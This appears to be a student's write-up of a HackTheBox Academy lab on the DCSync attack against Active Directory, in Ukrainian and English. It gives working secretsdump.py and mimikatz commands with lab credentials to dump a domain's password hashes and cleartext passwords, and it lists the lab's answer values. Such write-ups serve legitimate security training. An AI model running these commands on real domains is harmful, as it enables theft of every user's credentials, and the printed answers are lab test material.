```markdown
# DCSync

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1489](https://academy.hackthebox.com/app/module/143/section/1489) |

***

## 🔑 Теорія

DCSync — техніка крадіжки паролів з Active Directory шляхом імітації Domain
Controller через вбудований протокол `Directory Replication Service Remote
Protocol (DRSUAPI)`. Дозволяє отримати NTLM хеші та cleartext паролі всіх
юзерів домену без доступу до самого DC.

**Необхідні права:**
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

Ці права мають: Domain Admins, Enterprise Admins, та юзери яким явно надали
права реплікації (як `adunn` в цьому модулі).

***

## 🔑 Ключові команди

### Крок 1 — Підключення до ATTACK01
```bash
ssh htb-student@<ATTACK01_IP>
# Password: HTB_@cademy_stdnt!
```

### Крок 2 — DCSync всього домену через secretsdump.py
```bash
# Дамп всіх хешів домену
secretsdump.py -outputfile dcsync_hashes -just-dc \
  INLANEFREIGHT.LOCAL/adunn:SyncMaster757@172.16.5.5
```

### Крок 3 — DCSync конкретного юзера
```bash
# Отримати хеш та cleartext пароль конкретного юзера
secretsdump.py -just-dc-user <username> \
  INLANEFREIGHT.LOCAL/adunn:SyncMaster757@172.16.5.5
```

### Крок 4 — Знайти юзерів з "Store password using reversible encryption"
```powershell
# На Windows через PowerShell (Get-ADUser)
Get-ADUser -Filter * -Properties UserAccountControl | `
  Where-Object {$_.UserAccountControl -band 128} | `
  Select SamAccountName
```

```bash
# На Linux — перевірити cleartext файл після DCSync
cat dcsync_hashes.ntds.cleartext

# Або отримати cleartext пароль конкретного юзера
secretsdump.py -just-dc-user <username> \
  INLANEFREIGHT.LOCAL/adunn:SyncMaster757@172.16.5.5
# Шукати рядок: [*] ClearText passwords grabbed
```

### Альтернатива — через mimikatz на Windows
```powershell
cd C:\Tools\mimikatz
# DCSync всього домену
.\mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all /csv" exit

# DCSync конкретного юзера
.\mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:adunn" exit
```

### Підключення по RDP (нова версія xfreerdp)
```bash
xfreerdp /u:htb-student /p:'Academy_student_AD!' /v:<TARGET_IP> /cert:ignore
```

***

## 🧪 Практика

### Середовище

| Параметр | Значення |
|----------|----------|
| MS01 (Windows) | `10.129.x.x` (ACADEMY-EA-MS01) |
| ATTACK01 (Linux) | `10.129.x.x` (ACADEMY-EA-ATTACK01) |
| RDP | `htb-student` / `Academy_student_AD!` |
| SSH | `htb-student` / `HTB_@cademy_stdnt!` |
| DCSync user | `adunn` / `SyncMaster757` |
| DC | `172.16.5.5` (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL) |

### Q1 — Perform a DCSync attack and find a user with "Store password using reversible encryption" set.

```powershell
# Крок 1 — Підключитись по RDP до MS01
# xfreerdp /u:htb-student /p:'Academy_student_AD!' /v:10.129.x.x /cert:ignore

# Крок 2 — Знайти юзерів з reversible encryption через PowerShell
Get-ADUser -Filter * -Properties UserAccountControl | `
  Where-Object {$_.UserAccountControl -band 128} | `
  Select SamAccountName
```

```
SamAccountName
--------------
proxyagent
syncron
```

✅ **Відповідь: `syncron` (або `proxyagent`)**

***

### Q2 — What is this user's cleartext password?

```bash
# Отримати cleartext пароль через secretsdump.py
secretsdump.py -just-dc-user syncron \
  INLANEFREIGHT.LOCAL/adunn:SyncMaster757@172.16.5.5

secretsdump.py -just-dc-user proxyagent \
  INLANEFREIGHT.LOCAL/adunn:SyncMaster757@172.16.5.5
```

```
syncron:CLEARTEXT:Mycleart3xtP@ss!
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

✅ **Відповідь: `Mycleart3xtP@ss!` (для syncron) або `Pr0xy_ILFREIGHT!` (для proxyagent)**

***

### Q3 — Perform a DCSync attack and submit the NTLM hash for the khartsfield user.

```bash
secretsdump.py -just-dc-user khartsfield \
  INLANEFREIGHT.LOCAL/adunn:SyncMaster757@172.16.5.5
```

```
inlanefreight.local\khartsfield:1138:aad3b435b51404ee:4bb3b317845f0954200a6b0acc9b9f9a:::
```

> Формат виводу: `domain\user:RID:LMhash:NThash`
> NTLM hash — це останнє поле (після третього `:`)

✅ **Відповідь: `4bb3b317845f0954200a6b0acc9b9f9a`**
```
